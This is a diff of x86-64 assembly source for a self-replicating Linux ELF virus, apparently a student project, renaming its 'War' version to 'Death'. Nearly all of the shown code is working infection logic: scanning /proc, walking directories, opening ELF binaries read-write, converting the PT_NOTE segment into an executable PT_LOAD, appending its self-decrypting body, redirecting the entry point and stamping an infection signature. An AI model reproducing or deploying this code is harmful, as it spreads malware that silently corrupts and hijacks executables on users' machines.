@@ -1,4 +1,4 @@
-%include "inc/war.inc"
+%include "inc/death.inc"
 
 default rel
 
@@ -37,7 +37,7 @@ section .text
         push rax
         push rdi
         mov rax, SC_CLOSE
-        mov rdi, VAR(War.fd_proc)
+        mov rdi, VAR(Death.fd_proc)
         syscall ; nos la suda lo que esto retorne la verdad
         pop rdi
         pop rax
@@ -48,7 +48,7 @@ section .text
         push rax
         push rdi
         mov rax, SC_CLOSE
-        mov rdi, VAR(War.fd_status)
+        mov rdi, VAR(Death.fd_status)
         syscall
         pop rdi
         pop rax
@@ -72,21 +72,21 @@ section .text
     __F_strlen__end:
 
     __F_mod_pt_note:
-        ; War.note_phdr_ptr es una dirección de memoria que apunta a un puntero
-        lea rax, VAR(War.note_phdr_ptr)
+        ; Death.note_phdr_ptr es una dirección de memoria que apunta a un puntero
+        lea rax, VAR(Death.note_phdr_ptr)
         mov rax, [rax]
         mov [rax], dword 0x01                           ; p_type = PT_LOAD
         mov [rax+Elf64_Phdr.p_flags], dword P_FLAGS     ; P_FLAGS = PF_X | PF_R | PF_W
-        mov ecx, dword VAR(War.file_final_len)
-        sub ecx, dword VAR(War.virus_size)
+        mov ecx, dword VAR(Death.file_final_len)
+        sub ecx, dword VAR(Death.virus_size)
         mov [rax+Elf64_Phdr.p_offset], rcx              ; p_offset = file_final_len - virus_size
-        mov VAR(War.virus_offset), rcx
-        mov rcx, VAR(War.max_vaddr_end)
+        mov VAR(Death.virus_offset), rcx
+        mov rcx, VAR(Death.max_vaddr_end)
         ALIGN rcx
         mov [rax+Elf64_Phdr.p_vaddr], rcx               ; p_vaddr = ALIGN(max_pvaddr_len)
         mov [rax+Elf64_Phdr.p_paddr], rcx               ; p_paddr = p_vaddr
-        mov VAR(War.new_entry), rcx
-        mov ecx, dword VAR(War.virus_size)
+        mov VAR(Death.new_entry), rcx
+        mov ecx, dword VAR(Death.virus_size)
         mov [rax+Elf64_Phdr.p_filesz], rcx              ; p_filesz = virus_size
         mov [rax+Elf64_Phdr.p_memsz], rcx               ; p_memsz = virus_size
         mov qword [rax+Elf64_Phdr.p_align], 0x1000      ; p_align = 0x1000 (4KB)
@@ -95,9 +95,9 @@ section .text
 
     __F_ftruncate:
         ; ftruncate(fd_file, file_final_len)
-        mov rdi, VAR(War.fd_file)
+        mov rdi, VAR(Death.fd_file)
         xor rsi, rsi
-        mov esi, dword VAR(War.file_final_len)
+        mov esi, dword VAR(Death.file_final_len)
         mov rax, SC_FTRUNCATE
         syscall
         test rax, rax
@@ -156,22 +156,22 @@ section .text
 
     __F_mmap:
         ; mmap size : original_len + 0x4000. After ftruncate, writes are OK
-        mov eax, dword VAR(War.file_original_len)
+        mov eax, dword VAR(Death.file_original_len)
         ; align current size to end at 4K page so our payload is aligned by writing it
         ; at the end.
         ALIGN rax
-        mov ecx, dword VAR(War.virus_size)
+        mov ecx, dword VAR(Death.virus_size)
         add rax, rcx
 
         ; save aligned size of file + virus size.
-        mov dword VAR(War.file_final_len), eax
+        mov dword VAR(Death.file_final_len), eax
 
         ; mmap(NULL, file_original_len, PROT_READ | PROT_WRITE, MAP_SHARED, fd_file, 0)
         mov rdi, 0x0
         mov rsi, rax
         mov rdx, PROT_READ | PROT_WRITE
         mov r10, MAP_SHARED
-        mov r8, VAR(War.fd_file)
+        mov r8, VAR(Death.fd_file)
         mov r9, 0x0
         mov rax, SC_MMAP
         syscall
@@ -179,47 +179,6 @@ section .text
     __F_mmap__end:
 
     __F_set_unique_trace:
-        push rax
-        push rbx
-        push rcx
-        push rdx
-        push rdi
-        push rsi
-        mov rax, SC_GETTIME
-        mov rdi, 0
-        lea rsi, VAR(War.ts)
-        syscall
-        mov rax, VAR(War.ts)
-        mov rdi, 0x1e9
-        mul rdi
-        xor rcx, rcx
-        lea rdi, [rel Traza + 47]
-        .convert:
-            xor rdx, rdx        ; limpiar rdx
-            mov rbx, 10
-            div rbx             ; rax = rax / 10
-                                ; rdx = resto
-            add dl, '0'         ; convertir a ASCII
-           push rdx            ; guardar dígito en stack
-            inc rcx
-            test rax, rax
-            jnz .convert
-        .write_loop:
-            pop rax
-            mov [rdi], al
-            inc rdi
-            loop .write_loop            
-
-        pop rsi
-        pop rdi
-        pop rdx
-        pop rcx
-        pop rbx
-        pop rax
-        ret
-    __F_set_unique_trace__end:
-
-    __F_set_unique_trace2:
         sub rsp, 12
         lea rdi, [rsp]
         mov rsi, 12
@@ -248,14 +207,14 @@ section .text
             ; rdi = 65137838234
         .write_signature:
             mov rax, rdi
-            lea rdi, [rel Traza + 47]
+            lea rdi, [rel Traza + 49]
             mov rsi, rax
             mov rcx, 12
             cld
             rep movsb
         add rsp, 12
         ret
-    __F_set_unique_trace2__end:
+    __F_set_unique_trace__end:
 
 
 ; ----------------------------------------------------------------------------------------------------------------------
@@ -264,15 +223,15 @@ section .text
 
         PUSH_ALL
         push rsp
-        ; this trick allows us to access War members using the VAR macro
+        ; this trick allows us to access Death members using the VAR macro
         mov rbp, rsp
-        sub rbp, War_size            ; allocate War struct on stack
+        sub rbp, Death_size            ; allocate Death struct on stack
 
         ; load virus size
         lea rax, _start
         lea rbx, _finish
         sub rbx, rax
-        mov dword VAR(War.virus_size), ebx
+        mov dword VAR(Death.virus_size), ebx
         
         CALL_ENCRYPT(encrypt_block) ; desencripta
 
@@ -285,12 +244,12 @@ section .text
         test rax, rax
         ; si falla el open de /proc, infectamos sin comprobaciones.
         jle .jump_to_host
-        mov VAR(War.fd_proc), rax
+        mov VAR(Death.fd_proc), rax
 
     .dirent_proc:
          ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
-        mov rdi, VAR(War.fd_proc)
-        lea rsi, VAR(War.dirent_buffer)
+        mov rdi, VAR(Death.fd_proc)
+        lea rsi, VAR(Death.dirent_buffer)
         mov rdx, 1024
         mov rax, SC_GETDENTS64
         syscall
@@ -305,7 +264,7 @@ section .text
         cmp r12, rbx
         jge .dirent_proc
 
-        lea rdi, VAR(War.dirent_buffer)
+        lea rdi, VAR(Death.dirent_buffer)
         add rdi, r12
 
         ; sumamos a r12 el tamaño de el dirent que vamos a procesar.
@@ -399,7 +358,7 @@ section .text
         jle .start_infection
 
         ; guardamos el valor del fd para poder cerrarlo a posteriori
-        mov VAR(War.fd_status), rax
+        mov VAR(Death.fd_status), rax
 
         ; leemos el ficherín (raro sería que midiese mas de 4KB)
         mov rdi, rax
@@ -464,7 +423,7 @@ section .text
 
     .open_dir:
         ; save dirname pointer to iterate after
-        mov VAR(War.dir_name_pointer), rdi
+        mov VAR(Death.dir_name_pointer), rdi
 
         ; open(rdi, O_RDONLY | O_DIRECTORY);
         mov rsi, O_RDONLY | O_DIRECTORY
@@ -474,13 +433,13 @@ section .text
         jl .next_dir
 
         ; save fd
-        mov VAR(War.fd_dir), rax
+        mov VAR(Death.fd_dir), rax
 
     ; get directory entry
     .dirent:
         ; getdents64(fd_dir, dirent_buffer, sizeof(dirent_buffer));
-        mov rdi, VAR(War.fd_dir)
-        lea rsi, VAR(War.dirent_buffer)
+        mov rdi, VAR(Death.fd_dir)
+        lea rsi, VAR(Death.dirent_buffer)
         mov rdx, 1024
         mov rax, SC_GETDENTS64
         syscall
@@ -501,7 +460,7 @@ section .text
         jge .dirent
 
         ; shift offset from the start of the dirent struct array
-        lea rdi, VAR(War.dirent_buffer)
+        lea rdi, VAR(Death.dirent_buffer)
         add rdi, r12
         CALL_ENCRYPT(crazy)
         ; add lenght of directory entry to offset
@@ -519,14 +478,14 @@ section .text
 
         ; openat(fd_dir, d_name (&rsi), O_RDWR);
         lea rsi, [rdi]
-        mov rdi, VAR(War.fd_dir)
+        mov rdi, VAR(Death.fd_dir)
         mov rdx, O_RDWR
         mov rax, SC_OPENAT
         syscall
         test rax, rax
         jle .skip_file
 
-        mov VAR(War.fd_file), rax
+        mov VAR(Death.fd_file), rax
 
     .fstat:
         sub rsp, 144                ;fstat struct buffer
@@ -543,7 +502,7 @@ section .text
         cmp eax, S_IFREG            ; reg file type
         jne .close_file
         mov rax, [rsp + 48]
-        mov dword VAR(War.file_original_len), eax
+        mov dword VAR(Death.file_original_len), eax
 
         jmp .check_ehdr
 
@@ -555,7 +514,7 @@ section .text
         add rsp, 144                        ; deallocate fstat struct from stack
 
         ; read(fd_file, rsi, 64);
-        mov rdi, VAR(War.fd_file)
+        mov rdi, VAR(Death.fd_file)
         sub rsp, Elf64_Ehdr_size            ; alloc sizeof(Elf64_Ehdr) on stack
         lea rsi, [rsp]                      ; rsi = &rsp
         mov rdx, Elf64_Ehdr_size
@@ -584,12 +543,12 @@ section .text
 
         test rax, rax
         jle .close_file
-        mov VAR(War.mmap_ptr), rax   ; save mmap_ptr
+        mov VAR(Death.mmap_ptr), rax   ; save mmap_ptr
 
     .check_infect:
         mov rcx, dword Traza_position
         mov rsi, rax
-        mov ebx, dword VAR(War.file_original_len)
+        mov ebx, dword VAR(Death.file_original_len)
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
@@ -600,15 +559,15 @@ section .text
 
     .infect:
         mov rbx, [rax + Elf64_Ehdr.e_entry]         ; rbx = &(rax + e_entry)
-        mov VAR(War.original_entry), rbx     ; save original_entry
+        mov VAR(Death.original_entry), rbx     ; save original_entry
         lea rbx, [rax + Elf64_Ehdr.e_phoff]         ; rbx = &(rax + e_phoff)
         mov rbx, [rbx]                              ; rbx = rax + *(rbx)
         add rbx, rax
         movzx eax, word [rax + Elf64_Ehdr.e_phnum]
         ; initialize variables seeked in loop header
         xor ecx, ecx
-        mov VAR(War.note_phdr_ptr), rcx
-        mov VAR(War.max_vaddr_end), rcx
+        mov VAR(Death.note_phdr_ptr), rcx
+        mov VAR(Death.max_vaddr_end), rcx
 
     ;rax = phnum
     ;rbx = phdr_pointer
@@ -624,9 +583,9 @@ section .text
         jmp .end_loop_phdr
 
     .assign_pt_note_phdr:
-        cmp qword VAR(War.note_phdr_ptr), 0x0
+        cmp qword VAR(Death.note_phdr_ptr), 0x0
         jne .next_phdr
-        mov VAR(War.note_phdr_ptr), rbx
+        mov VAR(Death.note_phdr_ptr), rbx
         jmp .next_phdr
 
     .compute_max_vaddr_end:
@@ -634,10 +593,10 @@ section .text
         mov r8, [rbx+Elf64_Phdr.p_vaddr]
         add r8, [rbx+Elf64_Phdr.p_memsz]
         ; if p_vaddr + p_memsz > max_vaddr_end:
-        cmp r8, VAR(War.max_vaddr_end)
+        cmp r8, VAR(Death.max_vaddr_end)
         jl .next_phdr
         ; save new max_vaddr_end
-        mov VAR(War.max_vaddr_end), r8
+        mov VAR(Death.max_vaddr_end), r8
 
     .next_phdr:
         dec rax
@@ -645,9 +604,9 @@ section .text
         jmp .loop_phdr
 
     .end_loop_phdr:
-        cmp qword VAR(War.note_phdr_ptr), 0x0
+        cmp qword VAR(Death.note_phdr_ptr), 0x0
         je .munmap
-        cmp qword VAR(War.max_vaddr_end), 0x0
+        cmp qword VAR(Death.max_vaddr_end), 0x0
         je .munmap
 
     .ftruncate:
@@ -655,7 +614,7 @@ section .text
         jnz .munmap
         
     .unique_trace:
-        CALL_ENCRYPT(set_unique_trace2)
+        CALL_ENCRYPT(set_unique_trace)
 
     .mod_pt_note:
         CALL_ENCRYPT(mod_pt_note)
@@ -665,38 +624,38 @@ section .text
     
     .write_payload:
         lea rsi, _start
-        mov rdi, VAR(War.mmap_ptr)
-        add rdi, VAR(War.virus_offset)
+        mov rdi, VAR(Death.mmap_ptr)
+        add rdi, VAR(Death.virus_offset)
         ; nos guardamos el address del mmap que se corresponde con el principio
         ; del virus, movsb modifica este valor.
         push rdi
-        mov ecx, dword VAR(War.virus_size)
+        mov ecx, dword VAR(Death.virus_size)
         cld
         rep movsb
         pop rdi
         ; Patch host_entrypoint en el mmap con el entrypoint original
-        mov rax, VAR(War.original_entry)
+        mov rax, VAR(Death.original_entry)
         mov [rdi + (host_entrypoint - _start)], rax
         ; Patch virus_vaddr en el mmap con el nuevo entrypoint
-        mov rax, VAR(War.new_entry)
+        mov rax, VAR(Death.new_entry)
         mov [rdi + (virus_vaddr - _start)], rax
         ; Cambiar e_entry en el ELF Header
-        mov rax, VAR(War.mmap_ptr)
-        mov rbx, VAR(War.new_entry)
+        mov rax, VAR(Death.mmap_ptr)
+        mov rbx, VAR(Death.new_entry)
         mov [rax + Elf64_Ehdr.e_entry], rbx
 
         CALL_ENCRYPT(encrypt_block) ; desencipta
 
     .munmap:
         ;munmap(map_ptr, len)
-        mov rdi, VAR(War.mmap_ptr)
-        mov esi, dword VAR(War.file_final_len)
+        mov rdi, VAR(Death.mmap_ptr)
+        mov esi, dword VAR(Death.file_final_len)
         mov rax, SC_UNMAP
         syscall
 
     .close_file:
         ; TODO llamar al munmap antes de cerrar el fd.
-        mov rdi, VAR(War.fd_file)
+        mov rdi, VAR(Death.fd_file)
         mov rax, SC_CLOSE
         syscall
 
@@ -706,11 +665,11 @@ section .text
 
     .close_dir:
         mov rax, SC_CLOSE
-        mov rdi, VAR(War.fd_dir)
+        mov rdi, VAR(Death.fd_dir)
         syscall
 
     .next_dir:
-        mov rsi, VAR(War.dir_name_pointer)
+        mov rsi, VAR(Death.dir_name_pointer)
 
     .find_null:
         cld
@@ -723,7 +682,7 @@ section .text
 
     .jump_to_host:
         mov rsp, rbp
-        add rsp, War_size
+        add rsp, Death_size
         pop rsp
         POP_ALL
         ; Calcular dirección de retorno
@@ -748,7 +707,7 @@ section .text
     __F_data__end:
     Traza_position  equ     _finish - Traza
     fix_char        db      0
-    Traza           db      "War version 1.0 (c)oded by tomartin & carce-bo 000000000001",0  ;46
+    Traza           db      "Death version 1.0 (c)oded by tomartin & carce-bo 000000000001",0  ;46
     Traza_len       equ     $ - Traza - 1 - 12 - 1
     host_entrypoint dq      _dummy_host_entrypoint
     virus_vaddr     dq      _start
